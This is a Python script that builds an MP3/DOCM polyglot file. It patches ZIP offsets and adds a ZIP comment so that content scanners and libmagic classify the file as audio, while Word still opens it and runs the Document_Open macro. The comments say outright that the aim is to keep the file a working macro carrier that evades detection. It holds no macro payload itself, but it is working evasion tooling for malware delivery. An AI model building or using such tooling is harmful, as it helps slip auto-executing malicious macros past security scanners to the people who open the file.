#!/usr/bin/env python3
"""
build_v2.py — MP3 + DOCM polyglot stitcher.

Concatenates an MP3 (with ID3v2 tag at offset 0) and a DOCM (ZIP-based).
A scanner reading the first bytes sees `ID3` and classifies the file as
MP3. Word, given the `.docm` extension, locates the ZIP by scanning back
from EOF for the EOCD signature.

Two fixups make both sides hold:
- The DOCM's internal offsets are shifted by the MP3 length (absolute, like
  a self-extracting archive). Without this Word reports the package as
  corrupt and offers a repair, and a repaired document does not run its
  Document_Open macro.
- A short ZIP comment moves the EOCD away from the last 22 bytes. libmagic
  (file 5.46) otherwise follows a valid EOCD and reports "Zip archive";
  with the comment it keeps the "Audio file with ID3" verdict.

Stdlib-only.
"""
from __future__ import annotations

import argparse
import struct
import sys
import zipfile
from pathlib import Path

# The ZIP-offset patcher lives next to this script.
from zip_offset import find_eocd, shift_offsets  # noqa: E402


# --- ID3v2 sanity check ----------------------------------------------------

def parse_id3v2_size(data: bytes) -> int:
    """Return the total ID3v2 tag size (header + body), or 0 if no tag."""
    if len(data) < 10 or data[:3] != b"ID3":
        return 0
    # Synchsafe 28-bit integer in bytes [6..10).
    b = data[6:10]
    if any(x & 0x80 for x in b):
        raise ValueError("ID3v2 size field is not synchsafe")
    size = (b[0] << 21) | (b[1] << 14) | (b[2] << 7) | b[3]
    return 10 + size  # header + body


def check_mp3(path: Path) -> tuple[int, int]:
    data = path.read_bytes()
    tag_size = parse_id3v2_size(data)
    if tag_size == 0:
        print(f"[warn] {path} has no ID3v2 tag; scanner may not classify "
              f"as MP3 from offset-0 magic alone", file=sys.stderr)
    return tag_size, len(data)


# --- DOCM structural check -------------------------------------------------

REQUIRED_OFFICE_PARTS = (
    "[Content_Types].xml",
    "_rels/.rels",
    "word/document.xml",
)


def check_docm(path: Path) -> list[str]:
    with zipfile.ZipFile(path) as zf:
        names = zf.namelist()
        bad = zf.testzip()
        if bad is not None:
            raise ValueError(f"DOCM has bad member: {bad}")
    for req in REQUIRED_OFFICE_PARTS:
        if req not in names:
            raise ValueError(f"DOCM missing required part: {req}")
    if "word/vbaProject.bin" not in names:
        print(f"[warn] {path} has no word/vbaProject.bin — "
              f"this is a DOCX in disguise, not a macro carrier",
              file=sys.stderr)
    return names


# --- ZIP comment -----------------------------------------------------------

def set_comment(zip_bytes: bytes, comment: bytes) -> bytes:
    """Return zip_bytes with `comment` as the archive comment (EOCD must have none yet)."""
    data = bytearray(zip_bytes)
    eocd = find_eocd(data)
    if struct.unpack_from("<H", data, eocd + 20)[0] != 0 or eocd + 22 != len(data):
        raise ValueError("DOCM already has a ZIP comment")
    struct.pack_into("<H", data, eocd + 20, len(comment))
    return bytes(data) + comment


# --- Orchestration ---------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--mp3", required=True, type=Path)
    ap.add_argument("--docm", required=True, type=Path,
                    help="template DOCM to embed")
    ap.add_argument("--out", required=True, type=Path)
    ap.add_argument("--comment", default="polyglot: MP3 + DOCM",
                    help="ZIP comment appended after the EOCD (keeps libmagic on 'audio')")
    args = ap.parse_args()

    tag_size, mp3_len = check_mp3(args.mp3)
    print(f"[mp3]   {args.mp3} : {mp3_len} bytes, "
          f"ID3v2 tag size = {tag_size} bytes")

    docm_names = check_docm(args.docm)
    docm_bytes = args.docm.read_bytes()
    has_vba = "word/vbaProject.bin" in docm_names
    print(f"[docm]  {args.docm} : {len(docm_bytes)} bytes, "
          f"{len(docm_names)} parts, vbaProject.bin: {has_vba}")

    mp3_bytes = args.mp3.read_bytes()
    prefix_len = len(mp3_bytes)
    comment = args.comment.encode()
    docm_final = shift_offsets(set_comment(docm_bytes, comment), prefix_len)
    print(f"[patch] shifted ZIP offsets by +{prefix_len} (absolute, for Word) "
          f"and added a {len(comment)}-byte ZIP comment (keeps libmagic on 'audio')")
    polyglot = mp3_bytes + docm_final
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_bytes(polyglot)
    print(f"[out]   wrote {args.out} : {len(polyglot)} bytes "
          f"(prefix offset of ZIP region: {prefix_len:#x})")

    # Self-check 1: ID3v2 still at offset 0.
    tag_size2, _ = check_mp3(args.out)
    assert tag_size2 == tag_size, f"ID3v2 reparse drift: {tag_size2} != {tag_size}"
    print(f"[check] ID3v2 header re-parses at offset 0")

    # Self-check 2: ZIP / Office parts still locatable.
    with zipfile.ZipFile(args.out) as zf:
        bad = zf.testzip()
        if bad is not None:
            print(f"[check] ZIP CRC failure on member: {bad}", file=sys.stderr)
            return 2
        names = zf.namelist()
    missing = [p for p in REQUIRED_OFFICE_PARTS if p not in names]
    if missing:
        print(f"[check] Office parts missing post-stitch: {missing}",
              file=sys.stderr)
        return 3
    print(f"[check] ZIP testzip() OK, {len(names)} members, "
          f"all required Office parts present")
    return 0


if __name__ == "__main__":
    sys.exit(main())
